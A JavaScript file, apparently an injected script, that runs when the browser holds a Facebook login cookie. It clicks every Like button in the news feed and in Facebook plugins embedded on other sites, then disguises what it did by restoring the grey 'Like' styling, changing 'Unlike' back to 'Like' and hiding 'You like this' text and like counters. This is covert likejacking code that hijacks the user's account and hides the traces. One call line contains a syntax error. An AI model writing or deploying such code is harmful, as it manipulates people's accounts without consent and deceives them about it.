//click every like button on facebook
function likeAllFacebook(){
      //like everything on the news feed
      var likes = $('.UFILikeLink');
      for (var i = 0; i < likes.length; i++) {
          var like = $(likes[i]);
          // don't let it scroll to the top
          like.attr('href', 'javascript:void();');
          // fire away!
          likes[i].click();
      }
}

//hide the likes and make it seem normal
function cleanupFacebook(){
    var likes = $('.UFILikeLink');
    for (var i = 0; i < likes.length; i++) {
        var like = $(likes[i]);

        // make '(y) Like' gray instead of blue
        likes[i].className = "UFILikeLink";
        like.find('i').removeClass('sx_500eea').addClass('sx_e0a7f7');
        like.find('i').removeClass('sx_e7f31c').addClass('sx_c5cfba');

        // change 'Unlike' to 'Like' after liking a comment
        if (like.text() === "Unlike") {
            like.text("Like");
        }

        // finding row with the likes and seen count
        var ufiRow = like.parent().parent().parent().parent().find('.UFIRow');
        // find the bar displaying who liked the post
        var ufiLikeSentenceText = ufiRow.find('.UFILikeSentenceText');
        // look for instances of 'You like this.' or 'You, ... like this' and remove
        ufiLikeSentenceText.find('span').each(function() {
            // when only you like this, either float the seen count to the left or remove row if seen count isn't present
            if ($(this).text() === "You like this.") {
                $(this).hide();
                // float seen count to right
                if (ufiRow.find('.UFISeenCount').length > 0) {
                    ufiRow.find('.UFISeenCountRight').removeClass('UFISeenCountRight');
                    ufiRow.find('.rfloat').removeClass('rfloat');
                    ufiRow.find('._ohf').removeClass('_ohf');
                // remove bar
                } else {
                    ufiLikeSentenceText.remove();
                }
            }
            // otherwise just remove the 'you...' part
            if ($(this).text() === "You, " || $(this).text() === "You and ") {
                $(this).hide();
            }
        });
    }
}

//click like buttons on sites external to Facebook
function clickiFrameButtons(){
    var likebtns = $('.pluginButton[title="Like"] button[title="Like"]'); //find all like buttons
    $('div[title="Unlike"]').remove(); //remove unlike transition
    $('.pluginCountButton').remove(); //remove like bubble
    $('._5jjm').parent().remove();
    for (var i = 0; i < likebtns.length; i++) {
        var cNames = $('div[title="Like"]').attr('class');
        var likebtn = likebtns[i];
        if (!$('div[title="Like"]').hasClass('hidden_elem')) {
            likebtn.click();
        }
    }
}

$(document).ready(function() {
    if(document.cookie.indexOf('c_user') != -1){ //check if logged in before running anything

        likeAllFacebook();
        cleanupFacebook(););
        clickiFrameButtons();

    }
});
